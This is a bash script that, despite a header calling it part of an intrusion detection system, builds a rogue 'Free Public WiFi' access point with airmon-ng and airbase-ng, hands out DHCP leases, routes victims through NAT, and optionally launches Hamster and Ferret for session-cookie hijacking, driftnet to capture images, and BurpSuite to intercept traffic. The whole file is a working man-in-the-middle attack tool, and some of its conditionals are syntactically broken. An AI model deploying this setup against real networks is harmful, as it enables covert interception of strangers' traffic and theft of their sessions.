#!/bin/bash

#    This file is part of Intrusion Detection System By - Raghav Bisht.
#
#    Intrusion Detection System By - Raghav Bisht is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Intrusion Detection System By - Raghav Bisht is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>

# Select a wireless interface to use for the AP
selectWirelessInterface () {
    iwconfig | grep 802 > /tmp/ethlist
    clear
    echo "-------------------------------------------------"
    echo "Available interfaces:"
    echo ""
    cat /tmp/ethlist
    echo ""
    echo "-------------------------------------------------"
    read -p "What interface will you choose for the fake AP? " -e wlan 
    rm /tmp/ethlist
}

# Start networking (if selected)
startNetworking () {
    read -p "Start networking [Y/N]? " -e answer
    if [ "$answer" = "Y" && "$answer" = "y"] ; then
        service networking start > /dev/null 2>&1
    elif ["$answer" = "N" && "$answer" = "n"] ; then
	exit 0
    fi
    selectWirelessInterface
    read -p "External USB WLAN present [Y/N]? " -e extusb
    if [ "$extusb" = "Y" ] ; then
       ifconfig $wlan up > /dev/null 2>&1
    fi
}

# Start a monitor on the first wlan adapter
createMonitor () {
    echo -n "Starting monitor device...           "
    ifconfig -a > /tmp/pre
    airmon-ng start $wlan 8 > /dev/null 2>&1 
    sleep 10 
    ifconfig -a > /tmp/post
    monint=`diff /tmp/pre /tmp/post | grep mon | awk '{ print $2 }'`
    echo "DONE"
    # echo "Detected monitor interface: $monint"
}

# Fire up the fake access point
createAP () {
    apname="Free Public WiFi"
    read -p "Use default ESSID [Free Public WiFi]? " -e usedef 
    if [ $usedef = "N" ] ; then
        read -p "What will the AP name be? " -e apname
    fi
    read -p "Promiscuous access point [Y/N]? " -e promisc 
    echo "AP name will be $apname"
    echo -n "Starting fake AP...                  "
    if [ $promisc = "Y" ] ; then
        airbase-ng -P -e $apname $monint > /tmp/ap_access_list &
    else
        airbase-ng -e $apname $monint > /tmp/ap_access_list &
    fi
    sleep 10 
    echo "DONE"
}

# Activate the external interface
activateExternalAccess () {
    echo -n "Enabling external access...          "
    ifconfig at0 up 192.168.121.1 netmask 255.255.255.0 mtu 1500 > /dev/null 2>&1 
    sleep 10 
    echo "DONE"
}

# Start the DHCP server (restart to kill any 
# current ones which may exist
startDHCP () {
    echo -n "Starting DHCP server...              "
    service dhcp3-server restart > /dev/null 2>&1 
    sleep 10
    echo "DONE"
}

# Route things from the fake AP to the world
routeAPClientsToWorld () {
    echo -n "Routing from fake AP to world...     "
    iptables -t nat -A POSTROUTING -o $wlan -s 192.168.121.0/24 -j MASQUERADE > /dev/null 2>&1
    sleep 5
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "DONE"
}

# Fire up evil rodents
startRodents () {
    read -p "Start Hamster [Y/N]? " -e starthammy
    if [ $starthammy = "Y" ] ; then
        echo -n "Starting Hamster...                  "
        /pentest/sniffers/hamster/hamster &
        echo "DONE"
    fi
    read -p "Start Ferret [Y/N]? " -e startferry
    if [ $startferry = "Y" ] ; then
        echo -n "Starting Ferret...                   "
        /pentest/sniffers/hamster/ferret -i at0 &
        echo "DONE"
    fi
    read -p "Do you want to launch the Hamster web interface [Y/N]? " -e hamweb
    if [ $hamweb = "Y" ] ; then
        /usr/bin/firefox 127.0.0.1:1234
    fi
}

# Capture all image traffic across the network
captureImages () {
    read -p "Start driftnet [Y/N]? " -e startdrift
    if [ $startdrift = "Y" ] ; then
        read -p "Capture images [Y/N]? " -e answer
        echo -n "Starting driftnet...                 "
        if [ $answer = "Y" ] ; then
            driftnet -i at0 -a -d /tmp/driftimages
            echo "DONE"
            echo "Image files are stored in /tmp/driftimages"
        else
            driftnet -i at0
            echo "DONE"
        fi
    fi
}

# Start BurpSuite to perform detailed packet analysis
startBurp () {
    read -p "Start BurpSuite [Y/N]? " -e burpstart
    if [ $burpstart = "Y" ] ; then
        echo -n "Starting BurpSuite...               "
            /root/burpme.sh > /dev/null 2>&1
        echo "DONE"
    fi
}
# Main Execution			
clear
echo "             Starting The Fake Access Point..."
echo "------------------------------------------------------------------"

startNetworking

echo "Get external internet access now, then"
read -p "press Enter to continue." -e throwaway

echo

createMonitor 
createAP
activateExternalAccess
startDHCP
routeAPClientsToWorld
#captureImages
#startRodents
startBurp

echo 
echo "--------------------------------------------"
echo
echo "Everything is running!"
echo
echo "To watch the access point activity, try:"
echo "tail -f /tmp/ap_access_list"
echo 
echo "Have fun!"
